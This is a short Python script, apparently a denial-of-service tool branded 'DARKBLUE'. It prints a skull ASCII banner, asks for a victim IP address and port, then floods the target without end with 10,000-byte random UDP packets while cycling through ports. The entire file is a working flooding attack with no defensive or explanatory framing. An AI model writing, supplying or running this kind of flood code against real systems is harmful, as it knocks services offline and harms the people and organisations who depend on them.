import os
import random 
import socket 

from time import sleep
from datetime import datetime   

mtn = datetime.now()
heure = mtn.hour
minute = mtn.minute
annee = mtn.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)

print("____________ZZZZZZZZZZZZZZZZZZZZZ")
print("__________ZZZZZ______________ZZZZZZ")
print("________ZZZZZ____________________ZZZZ")
print("______ZZZZZ_______________________ZZZZZ")
print("____ZZZZZ___________________________ZZZZ")
print("___ZZZZ______________________________ZZZZ")
print("__ZZZ__________________________________ZZZ")
print("_ZZZ____________________________________ZZZ")
print("ZZZZ____________________________________ZZZ")
print("ZZZ_____________________________________ZZZ")
print("ZZZ_____________________________________ZZZ")
print("ZZZ_____________________________________ZZZ")
print("ZZZ_____________________________ZZ______ZZZ")
print("ZZZ___________________________ZZZZZ_____ZZZ")
print("ZZZ________________________ZZZZZZZZZ__ZZZZZ")
print("ZZZZ____ZZZ______________ZZZZZZZZZZZZ_ZZZZ")
print("ZZZZ___ZZZZZZ___________ZZZZZZZZZZZZZ_ZZZ")
print("ZZZZ__ZZZZZZZZZZ_______ZZZZZZZZZZZZZ__ZZ")
print("ZZZZ__ZZZZZZZZZZZ______ZZZZZZZZZZZZ___ZZ")
print("_ZZZ___ZZZZZZZZZZZ______ZZZZZZZZZZ____ZZ")
print("_ZZZ____ZZZZZZZZZ_ZZZZZ___ZZZZZZ____ZZZZ")
print("__ZZZ____ZZZZZZZ__ZZZZZZ___________ZZZZ")
print("___ZZZZZ__________Z__ZZZ_____ZZZZZZZZZ")
print("____ZZZZZZZZ__________ZZ____ZZZZZZZZ")
print("_____ZZZZZZZZ_____________ZZZZZ")
print("__________ZZZ__Z___Z___Z__ZZZ")
print("          ZZZ_ZZZ_ZZZ_ZZZ_ZZZ")
print("          ZZZ_ZZZ_ZZZ_ZZZ_ZZZ")
print("          ZZZ_ZZZ_ZZZ_ZZZ_ZZZ")
print("           ZZZZZZZZZZZZZZZZZ")
print("              ZZZZZZZZZZZ")
print 
print 
ip = input("IP Victime : ")
port = input("Port : ")
sent = 0

while True:
    sock.sendto(bytes, (str(ip),int(port)))
    sent = int(sent) + 1
    port = int(port) + 1
    print(f"DARKBLUE : {sent} packet to {ip} through port:{port}")
    if port == 65534:
        port = port - 1